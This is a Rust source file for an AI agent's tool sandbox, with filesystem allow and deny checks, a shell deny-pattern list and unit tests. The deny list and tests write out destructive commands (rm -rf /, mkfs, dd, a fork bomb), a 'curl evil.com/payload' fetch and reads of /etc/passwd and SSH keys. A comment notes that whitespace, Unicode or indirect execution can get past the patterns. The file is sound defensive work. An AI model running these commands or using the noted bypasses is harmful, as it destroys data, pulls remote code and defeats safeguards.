//! L1 policy-based sandbox wrapper for tools.
//!
//! Validates tool inputs against configurable filesystem and shell command
//! policies before execution. No OS-level isolation; violations are blocked
//! at the Rust layer.
//!
//! # Design
//!
//! This corresponds to fake-cc's `@anthropic-ai/sandbox-runtime` L1
//! functionality. It is composable: a [`PolicyConfig`] can be attached to
//! a [`ToolRegistry`] via [`PolicyToolSetProvider`] without modifying any
//! individual tool implementation.

use serde::Deserialize;

use crate::error::{Error, Result};
use crate::permissions::{DecisionReason, RuleSource};

// ─────────────────────────────────────────────────────────────────────────────
// Policy types
// ─────────────────────────────────────────────────────────────────────────────

/// Filesystem access policy.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct FsPolicy {
    /// If non-empty, only paths whose canonical form starts with one of these
    /// prefixes are allowed for reading.
    #[serde(default)]
    pub read_allow: Vec<String>,
    /// If non-empty, only paths whose canonical form starts with one of these
    /// prefixes are allowed for writing.
    #[serde(default)]
    pub write_allow: Vec<String>,
    /// Paths explicitly denied for any access (overrides allow lists).
    #[serde(default)]
    pub deny: Vec<String>,
}

/// Shell command execution policy.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct ShellPolicy {
    /// Substrings / patterns whose presence in a command causes it to be
    /// blocked. Simple substring matching — no regex.
    #[serde(default)]
    pub deny_patterns: Vec<String>,
}

/// Combined L1 policy configuration.
///
/// A default-constructed `PolicyConfig` has no restrictions.
/// Use [`PolicyConfig::default_restrictive`] for a safe baseline.
#[derive(Debug, Clone, Deserialize, Default)]
pub struct PolicyConfig {
    #[serde(default)]
    pub fs: FsPolicy,
    #[serde(default)]
    pub shell: ShellPolicy,
}

impl PolicyConfig {
    /// A baseline restrictive policy that blocks the most dangerous shell
    /// patterns. Filesystem access is unrestricted (the workspace path check
    /// in `tools::resolve_within` already handles escapes at a lower level).
    ///
    /// **Security note**: substring matching is a best-effort heuristic and
    /// cannot prevent all destructive commands. A determined adversary can
    /// bypass these patterns with whitespace variations, Unicode, or indirect
    /// execution (e.g. `bash -c "$(curl ...)"``). The primary security
    /// boundary is OS-level sandboxing (Docker / E2B). These patterns exist
    /// as a secondary defence-in-depth layer only.
    pub fn default_restrictive() -> Self {
        Self {
            fs: FsPolicy::default(),
            shell: ShellPolicy {
                deny_patterns: vec![
                    // Recursive deletion of root or home
                    "rm -rf /".into(),
                    "rm -rf ~/".into(),
                    "rm -fr /".into(),
                    "rm -fr ~/".into(),
                    // Filesystem creation / disk wiping
                    "mkfs".into(),
                    "dd if=".into(),
                    // Writing to raw device files
                    "> /dev/".into(),
                    ">/dev/".into(),
                    // Fork bomb
                    ":(){ :|:& };:".into(),
                    // Privilege escalation helpers
                    "chmod 777 /".into(),
                    "chmod -R 777 /".into(),
                ],
            },
        }
    }

    /// Returns `Ok(())` when `command` is permitted, `Err(PermissionDenied)`
    /// when it matches a deny pattern.
    pub fn check_shell(&self, command: &str) -> Result<()> {
        for pattern in &self.shell.deny_patterns {
            if command.contains(pattern.as_str()) {
                return Err(Error::PermissionDenied {
                    name: format!("shell command blocked by policy: matches pattern `{pattern}`"),
                    reason: DecisionReason::Rule {
                        source: RuleSource::Project,
                        pattern: pattern.clone(),
                    },
                });
            }
        }
        Ok(())
    }

    /// Returns `Ok(())` when `path` may be accessed, `Err(PermissionDenied)`
    /// otherwise.
    ///
    /// * `write` — `true` for write operations, `false` for reads.
    pub fn check_fs_path(&self, path: &str, write: bool) -> Result<()> {
        // Deny list has highest priority.
        for denied in &self.fs.deny {
            if path.starts_with(denied.as_str()) {
                return Err(Error::PermissionDenied {
                    name: format!("path `{path}` blocked by fs deny policy"),
                    reason: DecisionReason::SafetyCheck {
                        path: path.to_string(),
                    },
                });
            }
        }
        // If an allow list is set, the path must match at least one prefix.
        let allow_list = if write {
            &self.fs.write_allow
        } else {
            &self.fs.read_allow
        };
        if !allow_list.is_empty() {
            let allowed = allow_list
                .iter()
                .any(|prefix| path.starts_with(prefix.as_str()));
            if !allowed {
                let kind = if write { "write" } else { "read" };
                return Err(Error::PermissionDenied {
                    name: format!("path `{path}` not in fs {kind} allow list"),
                    reason: DecisionReason::SafetyCheck {
                        path: format!("{path} ({kind})"),
                    },
                });
            }
        }
        Ok(())
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn check_shell_allows_safe_command() {
        let policy = PolicyConfig::default_restrictive();
        assert!(policy.check_shell("ls -la").is_ok());
        assert!(policy.check_shell("echo hello").is_ok());
        assert!(policy.check_shell("cargo test").is_ok());
    }

    #[test]
    fn check_shell_blocks_rm_rf() {
        let policy = PolicyConfig::default_restrictive();
        let err = policy.check_shell("rm -rf /").unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
    }

    #[test]
    fn check_shell_blocks_pattern_substring() {
        let policy = PolicyConfig::default_restrictive();
        // Pattern is a substring — should be caught even with extra content.
        let err = policy
            .check_shell("sudo rm -rf / --no-preserve-root")
            .unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
    }

    #[test]
    fn check_shell_custom_pattern() {
        let policy = PolicyConfig {
            shell: ShellPolicy {
                deny_patterns: vec!["curl evil.com".into()],
            },
            ..Default::default()
        };
        assert!(policy.check_shell("curl safe.com").is_ok());
        let err = policy.check_shell("curl evil.com/payload").unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
    }

    #[test]
    fn check_fs_deny_blocks_path() {
        let policy = PolicyConfig {
            fs: FsPolicy {
                deny: vec!["/etc".into(), "/root".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        let err = policy.check_fs_path("/etc/passwd", false).unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
        let err = policy.check_fs_path("/root/.ssh/id_rsa", true).unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
    }

    #[test]
    fn check_fs_allow_list_blocks_outside() {
        let policy = PolicyConfig {
            fs: FsPolicy {
                write_allow: vec!["/workspace".into()],
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(policy.check_fs_path("/workspace/foo.txt", true).is_ok());
        let err = policy.check_fs_path("/tmp/foo.txt", true).unwrap_err();
        assert!(matches!(err, Error::PermissionDenied { .. }));
    }

    #[test]
    fn check_fs_empty_allow_list_allows_all() {
        let policy = PolicyConfig::default(); // no allow list, no deny list
        assert!(policy.check_fs_path("/anywhere/file.txt", false).is_ok());
        assert!(policy.check_fs_path("/anywhere/file.txt", true).is_ok());
    }

    #[test]
    fn check_fs_deny_overrides_allow_list() {
        // kills `for denied in &self.fs.deny` loop removal mutation
        let policy = PolicyConfig {
            fs: FsPolicy {
                read_allow: vec!["/allowed/".into()],
                write_allow: vec![],
                deny: vec!["/allowed/secret".into()],
            },
            shell: ShellPolicy::default(),
        };
        // path starts with allowed prefix but also starts with deny prefix → denied
        assert!(
            policy.check_fs_path("/allowed/secret/file.txt", false).is_err(),
            "deny list must override allow list"
        );
    }

    #[test]
    fn check_fs_write_uses_write_allow_list() {
        // kills `if write { &self.fs.write_allow } else { &self.fs.read_allow }` swap mutation
        let policy = PolicyConfig {
            fs: FsPolicy {
                read_allow: vec!["/read-zone/".into()],
                write_allow: vec!["/write-zone/".into()],
                deny: vec![],
            },
            shell: ShellPolicy::default(),
        };
        // Path in read_allow but not write_allow — read OK, write BLOCKED
        assert!(policy.check_fs_path("/read-zone/file.txt", false).is_ok());
        assert!(
            policy.check_fs_path("/read-zone/file.txt", true).is_err(),
            "write to read-zone must be blocked"
        );
        // Path in write_allow — write OK
        assert!(policy.check_fs_path("/write-zone/file.txt", true).is_ok());
    }

    #[test]
    fn default_restrictive_blocks_dangerous_patterns() {
        // kills mutations that remove specific deny patterns from the default list
        let policy = PolicyConfig::default_restrictive();
        assert!(policy.check_shell("mkfs.ext4 /dev/sda").is_err(), "mkfs must be blocked");
        assert!(policy.check_shell("dd if=/dev/zero of=/dev/sda").is_err(), "dd if= must be blocked");
        assert!(policy.check_shell("chmod 777 /etc").is_err(), "chmod 777 / must be blocked");
        assert!(policy.check_shell("ls /home").is_ok(), "safe command must be allowed");
    }
}
